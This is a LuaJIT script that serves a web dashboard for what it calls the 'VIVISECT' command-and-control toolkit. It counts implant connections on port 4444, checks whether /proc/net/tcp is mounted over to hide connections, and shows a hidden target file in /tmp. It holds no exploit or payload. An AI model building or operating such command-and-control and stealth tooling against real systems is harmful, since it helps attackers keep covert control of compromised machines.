#!/usr/bin/env luajit
-- vivisect_web_LIVE.lua - LIVE C2 Dashboard (AUTHORIZED USE ONLY)

local socket = require("socket")
local json = require("cjson") -- or use dkjson if cjson not available

local PORT = 8080
local STATS_FILE = "/tmp/.vivisect_stats.json"

-- Initialize stats
local stats = {
    wraiths_active = 0,
    gadgets_found = 0,
    last_exploit = "none",
    connections_hidden = false,
    uptime = os.time()
}

-- Update stats from C2
local function update_stats()
    -- Check if wraith is connected (look for active connection)
    local handle = io.popen("ss -tnp 2>/dev/null | grep 4444 | wc -l")
    if handle then
        stats.wraiths_active = tonumber(handle:read("*a")) or 0
        handle:close()
    end
    
    -- Check if connections are hidden
    local check = io.popen("mount | grep '/proc/net/tcp' | wc -l")
    if check then
        stats.connections_hidden = tonumber(check:read("*a")) > 0
        check:close()
    end
    
    -- Read last exploit results
    local exploit_file = io.open("/tmp/.vivisect_target", "rb")
    if exploit_file then
        local size = exploit_file:seek("end")
        exploit_file:close()
        stats.last_exploit = "Binary analyzed (" .. size .. " bytes)"
    end
end

local html_template = [[
<!DOCTYPE html>
<html>
<head>
    <title>VIVISECT LIVE - AUTHORIZED USE ONLY</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #f00; 
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .warning {
            background: #300;
            border: 3px solid #f00;
            color: #f00;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { 
            color: #f00; 
            text-shadow: 0 0 10px #f00;
            margin-bottom: 30px;
            text-align: center;
        }
        .section {
            background: #111;
            border: 1px solid #f00;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(255,0,0,0.2);
        }
        .section h2 { 
            color: #f00; 
            margin-bottom: 15px;
            border-bottom: 1px solid #f00;
            padding-bottom: 10px;
        }
        .status {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        .stat-box {
            background: #0a0a0a;
            border: 1px solid #f00;
            padding: 15px;
            text-align: center;
        }
        .stat-value {
            font-size: 2em;
            color: #f00;
            font-weight: bold;
        }
        .stat-label {
            color: #a00;
            margin-top: 5px;
        }
        button {
            background: #0a0a0a;
            color: #f00;
            border: 2px solid #f00;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background: #f00;
            color: #000;
        }
        .live-indicator {
            color: #f00;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="warning">
        ⚠️ AUTHORIZED USE ONLY ⚠️<br>
        This system is for legal security research on systems you own or have written permission to test.
    </div>
    
    <div class="container">
        <h1>⚔️ VIVISECT LIVE CONTROL ⚔️</h1>
        
        <div class="section">
            <h2>Real-Time Status <span class="live-indicator">●</span></h2>
            <div class="status">
                <div class="stat-box">
                    <div class="stat-value">{{WRAITHS}}</div>
                    <div class="stat-label">WRAITHS ACTIVE</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value">{{STEALTH}}</div>
                    <div class="stat-label">STEALTH MODE</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value">{{UPTIME}}</div>
                    <div class="stat-label">UPTIME (seconds)</div>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>Last Activity</h2>
            <div style="color: #a00;">{{LAST_EXPLOIT}}</div>
        </div>
    </div>
    
    <script>
        setInterval(() => location.reload(), 5000); // Refresh every 5s
    </script>
</body>
</html>
]]

local server = assert(socket.bind("*", PORT))
print("[*] VIVISECT LIVE dashboard on http://localhost:" .. PORT)
print("[!] AUTHORIZED USE ONLY")

while true do
    local client = server:accept()
    client:settimeout(1)
    
    local request = client:receive()
    if request and request:match("GET / ") then
        update_stats()
        
        local html = html_template
            :gsub("{{WRAITHS}}", tostring(stats.wraiths_active))
            :gsub("{{STEALTH}}", stats.connections_hidden and "ACTIVE" or "INACTIVE")
            :gsub("{{UPTIME}}", tostring(os.time() - stats.uptime))
            :gsub("{{LAST_EXPLOIT}}", stats.last_exploit)
        
        client:send("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" .. html)
    end
    
    client:close()
end
